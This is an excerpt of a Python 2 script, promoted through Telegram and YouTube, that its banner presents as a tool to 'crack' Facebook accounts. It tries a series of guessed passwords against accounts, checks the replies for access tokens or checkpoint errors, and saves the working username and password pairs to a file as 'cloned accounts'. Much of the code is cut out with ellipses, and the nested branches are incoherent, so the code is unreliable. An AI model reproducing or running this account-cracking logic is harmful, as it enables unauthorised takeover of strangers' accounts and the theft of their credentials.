# MY TELEGRAM CHANNEL @BEST_TECHING_001 
# MY TELEGRAM GROUP @BEST TECH 
#MY GITHUB HTTPS://GITHUB.COM/RAYEESNOOR538 
#THIS SCRIPT FREE 
...
def youtube():
	...
	os.system("xdg-open https://youtube.com/@nooratx7159")
	menu()
...
\033[1;97m      @             @     \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : RAYEESNOOR
\033[1;91m GitHub      : https://github.com/RAYEESNOOR538 
\033[1;91m YouTube     : BEST TECH 
\033[1;91m Telegram CH   : https://t.me/BEST_TECHING_001 
\033[1;91m TLEGRAM GP    : https://t.me/BEST TECH 
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY RAYEES NOOR'
        print '\x1b[1;92m THISE SCRIPT CREATED BY RAYEES NOOR'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('Nking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[NOOR_CP] ' + k + c + user + ' | ' + pass1
                cps = open('Nking.txt', 'a')
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;93m[NOOR_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Nking.txt', 'a')
                    ...
                    if 'access_token' in q:
                        ...
                        print ' \x1b[1;93m[NOOR_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Nking.txt', 'a')
                        ...
                        if 'access_token' in q:
                            ...
                            print ' \x1b[1;93m[NOOR_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Nking.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                print ' \x1b[1;93m[NOOR_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Nking.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : Nking.txt'
